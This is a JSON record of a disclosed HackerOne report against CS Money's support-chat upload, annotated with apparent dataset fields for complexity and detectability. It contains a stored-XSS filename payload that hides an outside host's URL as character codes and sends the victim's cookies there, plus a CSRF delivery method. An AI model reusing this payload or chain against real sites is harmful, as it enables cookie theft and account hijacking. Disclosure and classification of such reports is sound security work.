{
  "reported_to": "CS Money",
  "reported_by": "benjamin-mauss ",
  "title": "Blind XSS on image upload",
  "content": "\nSummary:\nThe CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!\nThe XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request.\nSteps To Reproduce:\nXSS\nuse a proxy like burp suite and turn intercept on\nupload a file to the support chat\nchange the filename to \\\"><img src=1 onerror=\\\"url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';\nopen the chat support and xss will activate\nCSRF\ncreate a file html in some server\ncreate a form with a file and the payload name\nsend to a new tab. This one will post the image with payload\nSupporting Material/References:\nhttps://onlinestringtools.com/convert-string-to-ascii to convert the attacker's website link to ascii\nImpact\nAllows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.\nFor the guys of support chat, they don't even need to click in the link for the XSS activate.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 1000,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1608959280,
  "report_url": "https://hackerone.com/reports/1010466",
  "vuln_category": "WEB_APP",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "steps": [
    [
      1,
      "Use a proxy like Burp Suite to intercept the file upload request to the support chat."
    ],
    [
      2,
      "Modify the filename parameter to include a malicious XSS payload that triggers when the file is viewed in the chat."
    ],
    [
      3,
      "Create an HTML file with a form that automatically submits a file upload request to the vulnerable endpoint with the XSS payload in the filename."
    ],
    [
      4,
      "Host the HTML file on a server and trick a victim into opening it, which will trigger the CSRF attack."
    ]
  ],
  "vuln_description": "The vulnerability combines Blind XSS and CSRF in the image upload functionality of a support chat system. The lack of CSRF protection allows attackers to force victims to upload files with malicious filenames containing XSS payloads. When support staff view the uploaded file in the chat, the XSS payload executes, potentially stealing sensitive information like cookies.",
  "reason": "This vulnerability requires understanding both CSRF and XSS attacks, and how to chain them together. The attacker needs to craft a specific XSS payload that works in the filename context and then deliver it via CSRF. While both components are common vulnerabilities, chaining them together and finding the right context for the XSS adds complexity.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The Blind XSS vulnerability involves a CSRF request to 'support.cs.money/upload_file' without proper CSRF token/origin/reference verification, and the XSS payload is executed via the 'filename' parameter. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypasses by swapping user sessions, actions, and resource IDs within the same application. Since the Blind XSS relies on a CSRF-triggered file upload with an XSS payload in the filename, it does not fit the described methodology of session/action/resource swapping for AuthN/AuthZ testing.",
    "is_detectable": false
  }
}